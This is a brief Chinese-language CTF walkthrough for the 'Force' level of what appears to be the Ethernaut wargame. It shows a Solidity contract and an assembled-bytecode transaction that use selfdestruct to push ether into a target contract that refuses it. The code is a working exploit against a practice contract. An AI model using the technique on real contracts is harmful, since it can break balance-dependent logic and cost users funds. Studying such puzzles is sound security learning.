## 7. Force

不是很明白这题的意图，直接使用`selfdestruct`强行转账即可。

不知道为什么，这么写合约编译出来的代码会自带一个对`msg.value`的检查，该值不为0时交易会被revert。原因未知（后来发现是忘了写payable）。只好直接使用汇编语言。

合约（失败）：

```sol
// SPDX-License-Identifier: MIT
pragma solidity >=0.4.25 <0.9.0;

contract Attacl {
  constructor() {
      selfdestruct(payable(address(0x76aE4F1030BA0FeC76ECE4A891Ca1e5F444CD53C)));
  }
}
```

使用汇编（成功）：

```ts
  alice.sendTransaction({
    to: undefined,
    data: assemble(parse('suicide(0x76aE4F1030BA0FeC76ECE4A891Ca1e5F444CD53C)'), {
      target: "_"
    }),
    value: toWei(0.0001),
    gasLimit: 100000,
  })
```


